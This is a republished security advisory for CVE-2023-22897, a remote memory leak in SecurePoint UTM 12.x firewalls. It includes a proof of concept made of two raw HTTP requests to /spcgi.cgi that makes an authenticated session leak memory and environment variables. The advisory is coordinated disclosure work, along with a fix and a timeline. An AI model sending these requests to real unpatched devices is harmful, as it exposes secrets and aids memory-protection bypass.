---
title: SecurePoint UTM 12.x Memory Leak
url: https://cxsecurity.com/issue/WLB-2023040064
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-19
fetch_date: 2025-10-04T11:31:50.055401
---

# SecurePoint UTM 12.x Memory Leak

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **SecurePoint UTM 12.x Memory Leak** **2023.04.18**  Credit:  **[Julien Ahrens](https://cxsecurity.com/author/Julien%2BAhrens/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-22897](https://cxsecurity.com/cveshow/CVE-2023-22897/ "Click to see CVE-2023-22897")**  CWE: **[CWE-457](https://cxsecurity.com/cwe/CWE-457 "Click to see CWE-457")** | |

RCE Security Advisory
https://www.rcesecurity.com
1. ADVISORY INFORMATION
=======================
Product: SecurePoint UTM
Vendor URL: https://www.securepoint.de/en/for-companies/firewall-vpn
Type: Use of Uninitialized Variable [CWE-457]
Date found: 2023-01-05
Date published: 2023-04-12
CVSSv3 Score: 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
CVE: CVE-2023-22897
2. CREDITS
==========
This vulnerability was discovered and researched by Julien Ahrens from
RCE Security.
3. VERSIONS AFFECTED
====================
SecurePoint UTM 12.2.5
SecurePoint UTM 12.2.5
SecurePoint UTM 12.2.4.1
SecurePoint UTM 12.2.4
SecurePoint UTM 12.2.3.4
SecurePoint UTM 12.2.3.3
SecurePoint UTM 12.2.3.2 Reseller Preview
SecurePoint UTM 12.2.3.1 Reseller Preview
4. INTRODUCTION
===============
With secure networks, home office, site connectivity and the protection of your
data are easy to implement. UTM firewalls and VPN gateways from Securepoint secure
your networks - with suitable IT security solutions for small and medium-sized
businesses for rent, purchase or as a complete service.
(from the vendor's homepage)
5. VULNERABILITY DETAILS
========================
The firewall offers an administrative web panel on port 11115 and a user login
panel on port 443. Both use the endpoint at "/spcgi.cgi" to perform authentication
checks via the "login" command. Once authentication is successful (a low-privileged
user account is sufficient), and the returned "sessionid" has never been used in
any subsequent request, then the application will return remote memory contents
within the sessionid JSON attribute on all subsequent requests (that don't contain
the sessionId, hence referring to as "unused"). The leaked memory contents include
memory addresses as well as environment variables.
This happens because the application doesn't correctly initialize a variable later
used in the JSON output referencing the sessionid.
Successful exploits can allow an authenticated attacker to leak memory contents,
which might contain sensitive information, and help defeat memory protections such
as ASLR.
6. PROOF OF CONCEPT
===================
First, authenticate using any legitimate user against either the admin panel on port
11115 or the user panel on port 443 by using a single HTTP POST request like the
following:
POST /spcgi.cgi HTTP/1.1
Host: 192.168.175.1
Content-Length: 100
Accept: \*/\*
Content-Type: application/json; charset=UTF-8
User-Agent: Mozilla/5.0
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
{"module":"auth","command":["login"],"sessionid":"","arguments":{"user":"user","pass":"Password"}}
This returns a sessionid, which you must not use in subsequent requests. This is
important because the exploit won't work if you authenticate using the web interface
because the sessionid is immediately "used" in further requests being issued by the
application.
Then submit any JSON request without a sessionid against the same endpoint, such as:
POST /spcgi.cgi HTTP/1.1
Host: 192.168.175.1
Content-Length: 2
Accept: \*/\*
Content-Type: application/json; charset=UTF-8
User-Agent: test
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
{}
The remote memory contents are afterward leaked in response to that request within
the sessionid JSON attribute.
7. SOLUTION
===========
Upgrade to version 12.2.5.1 or newer
8. REPORT TIMELINE
==================
2023-01-04: Discovery of the vulnerability
2023-01-06: Contacted vendor via a known contact
2023-01-06: Vendor response
2023-01-06: Sent full vulnerability details to vendor
2023-01-06: Vendor acknowledged the vulnerability
2023-01-06: Vendor asks to set the disclosure date to 2023-04-11 due to the # of affected customers
2023-01-06: RCE Security agrees to the proposed disclosure date
2023-01-06: Vendor publishes hotfix 12.2.5.1 which fixes the vulnerability
2023-01-10: MITRE assigns CVE-2023-22897
2023-04-12: Public disclosure
9. REFERENCES
==============
https://www.rcesecurity.com/2023/04/securepwn-part-2-leaking-remote-memory-contents-cve-2023-22897/
https://github.com/MrTuxracer/advisories

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040064)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top